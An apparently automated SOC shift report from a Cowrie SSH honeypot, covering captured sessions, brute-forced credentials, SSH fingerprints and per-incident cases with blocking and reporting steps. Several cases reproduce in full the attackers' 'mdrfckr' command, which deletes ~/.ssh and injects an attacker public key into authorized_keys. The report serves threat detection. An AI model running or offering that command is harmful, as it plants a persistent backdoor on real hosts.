# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-04 |
| **Generated At** | 2026-11-04T03:49:52Z |
| **Shift Time** | 03:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **75** |
| Confirmed Threats | **55** |
| False Positives Filtered | **20** (26.7%) |
| Unique Attacker IPs | **57** |
| Countries of Origin | **24** |
| High Severity Cases | **35** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **40** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **96** |
| Unique Credential Pairs | **45** |
| Unique Usernames | **21** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **57** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `rootssssss23424123123` | 18 |
| `admin` | 8 |
| `yx` | 6 |
| `ftpuser1` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `rootssssss23424123123` | 18 |
| `root3245gs5662d34111111111` | 18 |
| `admin` | 8 |
| `123456` | 6 |
| `support` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 18 |
| `admin` | `admin` | 8 |
| `root` | `root3245gs5662d34111111111` | 4 |
| `support` | `support` | 3 |
| `yx` | `123456` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `72.46.87.211` | 2026-11-04T00:07:33 |
| `mysql` | `password` | `10.0.0.73` | 2026-11-04T00:09:42 |
| `root` | `iny6hQCSgb` | `10.0.0.73` | 2026-11-04T00:09:55 |
| `ftpuser1` | `123456` | `129.121.117.162` | 2026-11-04T00:13:54 |
| `rootssssss23424123123` | `rootssssss23424123123` | `129.121.117.162` | 2026-11-04T00:13:56 |
| `ftpuser1` | `root3245gs5662d34111111111` | `129.121.117.162` | 2026-11-04T00:14:02 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-11-04T00:18:49 |
| `test` | `Admin@123` | `189.222.212.148` | 2026-11-04T00:21:06 |
| `rootssssss23424123123` | `rootssssss23424123123` | `189.222.212.148` | 2026-11-04T00:21:08 |
| `test` | `root3245gs5662d34111111111` | `189.222.212.148` | 2026-11-04T00:21:12 |
| `ubuntu` | `123456a@` | `171.244.39.95` | 2026-11-04T00:37:15 |
| `rootssssss23424123123` | `rootssssss23424123123` | `171.244.39.95` | 2026-11-04T00:37:19 |
| `ubuntu` | `root3245gs5662d34111111111` | `171.244.39.95` | 2026-11-04T00:37:22 |
| `brasil` | `brasil` | `10.0.0.73` | 2026-11-04T00:44:05 |
| `rootssssss23424123123` | `rootssssss23424123123` | `10.0.0.73` | 2026-11-04T00:44:07 |
| `brasil` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-04T00:44:11 |
| `root` | `!root` | `195.178.110.217` | 2026-11-04T00:45:01 |
| `root` | `111111` | `195.178.110.217` | 2026-11-04T00:47:03 |
| `root` | `123123` | `195.178.110.217` | 2026-11-04T00:49:25 |
| `root` | `1234` | `195.178.110.217` | 2026-11-04T00:54:53 |
_… 37 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **75** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 25 |
| Go SSH scanner | 14 |
| AsyncSSH (Python) | 1 |
| Unknown | 1 |
| Nmap scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 14 | 9 |
| `2ec37a7cc8da...` | Mirai/variant | 8 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 2 |
| `16443846184e...` | Generic scanner | 2 | 2 |
| `0a07365cc01f...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 14 | 9 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 8 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 6 | — |
| `03a80b21afa8...` | libssh | 3 | 2 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `d1c5d296d532...` | AsyncSSH (Python) | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **12** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.117.162`, `196.92.7.246`, `189.222.212.148`, `154.144.225.226`, `171.244.39.95`, `114.32.151.97`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **57** |
| Unique ASNs | **29** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 19 | HIGH |
| `AS6713` | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | 4 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS135341` | Orange Communication | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | LOW |
| `AS15169` | Google LLC | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (29)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7fe479e0a244

| Field | Detail |
|---|---|
| **Source IP** | `72.46.87[.]211` |
| **First Seen** | 2026-11-04 00:07 |
| **Last Seen** | 2026-11-04 00:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -m, cat /proc, >` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:07:32` | `cowrie.session.connect` |
| `2026-11-04 00:07:33` | `cowrie.login.success` |
| `2026-11-04 00:07:33` | `cowrie.session.params` |
| `2026-11-04 00:07:33` | `cowrie.command.input` |
| `2026-11-04 00:07:35` | `cowrie.command.input` |
| `2026-11-04 00:07:35` | `cowrie.command.input` |
| `2026-11-04 00:07:38` | `cowrie.log.closed` |
| `2026-11-04 00:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.46.87[.]211` to AbuseIPDB if not already reported
- [ ] Block `72.46.87[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ec230a45a3

| Field | Detail |
|---|---|
| **Source IP** | `129.121.117[.]162` |
| **First Seen** | 2026-11-04 00:13 |
| **Last Seen** | 2026-11-04 00:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:13:54` | `cowrie.session.connect` |
| `2026-11-04 00:13:54` | `cowrie.client.version` |
| `2026-11-04 00:13:54` | `cowrie.client.kex` |
| `2026-11-04 00:13:54` | `cowrie.login.success` |
| `2026-11-04 00:13:55` | `cowrie.session.params` |
| `2026-11-04 00:13:55` | `cowrie.command.input` |
| `2026-11-04 00:13:55` | `cowrie.command.failed` |
| `2026-11-04 00:13:55` | `cowrie.log.closed` |
| `2026-11-04 00:13:56` | `cowrie.session.params` |
| `2026-11-04 00:13:56` | `cowrie.command.input` |
| `2026-11-04 00:13:56` | `cowrie.session.file_download` |
| `2026-11-04 00:13:56` | `cowrie.log.closed` |
| `2026-11-04 00:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `129.121.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c672e10c5f2d

| Field | Detail |
|---|---|
| **Source IP** | `129.121.117[.]162` |
| **First Seen** | 2026-11-04 00:13 |
| **Last Seen** | 2026-11-04 00:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:13:56` | `cowrie.session.connect` |
| `2026-11-04 00:13:56` | `cowrie.client.version` |
| `2026-11-04 00:13:56` | `cowrie.client.kex` |
| `2026-11-04 00:13:56` | `cowrie.login.success` |
| `2026-11-04 00:13:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `129.121.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4381101139

| Field | Detail |
|---|---|
| **Source IP** | `189.222.212[.]148` |
| **First Seen** | 2026-11-04 00:21 |
| **Last Seen** | 2026-11-04 00:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:21:05` | `cowrie.session.connect` |
| `2026-11-04 00:21:05` | `cowrie.client.version` |
| `2026-11-04 00:21:05` | `cowrie.client.kex` |
| `2026-11-04 00:21:06` | `cowrie.login.success` |
| `2026-11-04 00:21:06` | `cowrie.session.params` |
| `2026-11-04 00:21:06` | `cowrie.command.input` |
| `2026-11-04 00:21:06` | `cowrie.command.failed` |
| `2026-11-04 00:21:07` | `cowrie.log.closed` |
| `2026-11-04 00:21:07` | `cowrie.session.params` |
| `2026-11-04 00:21:07` | `cowrie.command.input` |
| `2026-11-04 00:21:07` | `cowrie.session.file_download` |
| `2026-11-04 00:21:07` | `cowrie.log.closed` |
| `2026-11-04 00:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.222.212[.]148` to AbuseIPDB if not already reported
- [ ] Block `189.222.212[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774776353c24

| Field | Detail |
|---|---|
| **Source IP** | `189.222.212[.]148` |
| **First Seen** | 2026-11-04 00:21 |
| **Last Seen** | 2026-11-04 00:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:21:07` | `cowrie.session.connect` |
| `2026-11-04 00:21:07` | `cowrie.client.version` |
| `2026-11-04 00:21:07` | `cowrie.client.kex` |
| `2026-11-04 00:21:08` | `cowrie.login.success` |
| `2026-11-04 00:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.222.212[.]148` to AbuseIPDB if not already reported
- [ ] Block `189.222.212[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9a640b4788

| Field | Detail |
|---|---|
| **Source IP** | `171.244.39[.]95` |
| **First Seen** | 2026-11-04 00:37 |
| **Last Seen** | 2026-11-04 00:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:37:14` | `cowrie.session.connect` |
| `2026-11-04 00:37:14` | `cowrie.client.version` |
| `2026-11-04 00:37:14` | `cowrie.client.kex` |
| `2026-11-04 00:37:15` | `cowrie.login.success` |
| `2026-11-04 00:37:16` | `cowrie.session.params` |
| `2026-11-04 00:37:16` | `cowrie.command.input` |
| `2026-11-04 00:37:16` | `cowrie.command.failed` |
| `2026-11-04 00:37:17` | `cowrie.log.closed` |
| `2026-11-04 00:37:17` | `cowrie.session.params` |
| `2026-11-04 00:37:17` | `cowrie.command.input` |
| `2026-11-04 00:37:18` | `cowrie.session.file_download` |
| `2026-11-04 00:37:18` | `cowrie.log.closed` |
| `2026-11-04 00:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.39[.]95` to AbuseIPDB if not already reported
- [ ] Block `171.244.39[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c1822b62a35

| Field | Detail |
|---|---|
| **Source IP** | `171.244.39[.]95` |
| **First Seen** | 2026-11-04 00:37 |
| **Last Seen** | 2026-11-04 00:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:37:18` | `cowrie.session.connect` |
| `2026-11-04 00:37:18` | `cowrie.client.version` |
| `2026-11-04 00:37:18` | `cowrie.client.kex` |
| `2026-11-04 00:37:19` | `cowrie.login.success` |
| `2026-11-04 00:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.39[.]95` to AbuseIPDB if not already reported
- [ ] Block `171.244.39[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-283217cb3475

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-04 00:44 |
| **Last Seen** | 2026-11-04 00:46 |
| **Session Duration** | 119s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_63780f1a8cabe704fd81c074339198fc_small_control'"'"' '"'"'check_63780f1a8cabe704fd81c074339198fc'"'"'', printf '\n%s|%s\n' 'check_63780f1a8cabe704fd81c074339198fc_small_control' 'check_63780f1a8cabe704fd81c074339198fc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_63780f1a8cabe704fd81c074339198fc_small_math'"'"' "$((540*894+51))"', (540*894+51, printf '\n%s|%s\n' 'check_63780f1a8cabe704fd81c074339198fc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:44:58` | `cowrie.session.connect` |
| `2026-11-04 00:44:59` | `cowrie.client.version` |
| `2026-11-04 00:44:59` | `cowrie.client.kex` |
| `2026-11-04 00:45:01` | `cowrie.login.success` |
| `2026-11-04 00:45:03` | `cowrie.client.size` |
| `2026-11-04 00:45:04` | `cowrie.session.params` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| `2026-11-04 00:45:05` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e78eb562d1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-04 00:46 |
| **Last Seen** | 2026-11-04 00:49 |
| **Session Duration** | 140s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_13c9c2942f5774abd61d57777772b001_small_control'"'"' '"'"'check_13c9c2942f5774abd61d57777772b001'"'"'', printf '\n%s|%s\n' 'check_13c9c2942f5774abd61d57777772b001_small_control' 'check_13c9c2942f5774abd61d57777772b001', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_13c9c2942f5774abd61d57777772b001_small_math'"'"' "$((81*263+22))"', (81*263+22, printf '\n%s|%s\n' 'check_13c9c2942f5774abd61d57777772b001_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:46:57` | `cowrie.session.connect` |
| `2026-11-04 00:46:58` | `cowrie.client.version` |
| `2026-11-04 00:46:58` | `cowrie.client.kex` |
| `2026-11-04 00:47:03` | `cowrie.login.success` |
| `2026-11-04 00:47:06` | `cowrie.client.size` |
| `2026-11-04 00:47:07` | `cowrie.session.params` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| `2026-11-04 00:47:08` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2bf01f19dc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-04 00:49 |
| **Last Seen** | 2026-11-04 00:54 |
| **Session Duration** | 306s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0eac60a0e4611b304a09f711700ae2a0_small_control'"'"' '"'"'check_0eac60a0e4611b304a09f711700ae2a0'"'"'', printf '\n%s|%s\n' 'check_0eac60a0e4611b304a09f711700ae2a0_small_control' 'check_0eac60a0e4611b304a09f711700ae2a0', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0eac60a0e4611b304a09f711700ae2a0_small_math'"'"' "$((766*953+71))"', (766*953+71, printf '\n%s|%s\n' 'check_0eac60a0e4611b304a09f711700ae2a0_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:49:18` | `cowrie.session.connect` |
| `2026-11-04 00:49:19` | `cowrie.client.version` |
| `2026-11-04 00:49:19` | `cowrie.client.kex` |
| `2026-11-04 00:49:25` | `cowrie.login.success` |
| `2026-11-04 00:49:29` | `cowrie.client.size` |
| `2026-11-04 00:49:30` | `cowrie.session.params` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| `2026-11-04 00:49:31` | `cowrie.command.input` |
| … | _48 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493bfd8d99b1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-04 00:54 |
| **Last Seen** | 2026-11-04 00:55 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f4d2f6781c6c6ea0036a2af1502821c9_small_control'"'"' '"'"'check_f4d2f6781c6c6ea0036a2af1502821c9'"'"'', printf '\n%s|%s\n' 'check_f4d2f6781c6c6ea0036a2af1502821c9_small_control' 'check_f4d2f6781c6c6ea0036a2af1502821c9', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f4d2f6781c6c6ea0036a2af1502821c9_small_math'"'"' "$((861*664+13))"', (861*664+13, printf '\n%s|%s\n' 'check_f4d2f6781c6c6ea0036a2af1502821c9_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:54:35` | `cowrie.session.connect` |
| `2026-11-04 00:54:38` | `cowrie.client.version` |
| `2026-11-04 00:54:38` | `cowrie.client.kex` |
| `2026-11-04 00:54:53` | `cowrie.login.success` |
| `2026-11-04 00:55:03` | `cowrie.client.size` |
| `2026-11-04 00:55:06` | `cowrie.session.params` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| `2026-11-04 00:55:10` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b76b5db0af4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-04 00:55 |
| **Last Seen** | 2026-11-04 00:55 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6e52847eeda8d261cd82d032898736f4_small_control'"'"' '"'"'check_6e52847eeda8d261cd82d032898736f4'"'"'', printf '\n%s|%s\n' 'check_6e52847eeda8d261cd82d032898736f4_small_control' 'check_6e52847eeda8d261cd82d032898736f4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6e52847eeda8d261cd82d032898736f4_small_math'"'"' "$((327*225+16))"', (327*225+16, printf '\n%s|%s\n' 'check_6e52847eeda8d261cd82d032898736f4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:55:13` | `cowrie.session.connect` |
| `2026-11-04 00:55:16` | `cowrie.client.version` |
| `2026-11-04 00:55:16` | `cowrie.client.kex` |
| `2026-11-04 00:55:31` | `cowrie.login.success` |
| `2026-11-04 00:55:39` | `cowrie.client.size` |
| `2026-11-04 00:55:43` | `cowrie.session.params` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| `2026-11-04 00:55:46` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3b9f291639

| Field | Detail |
|---|---|
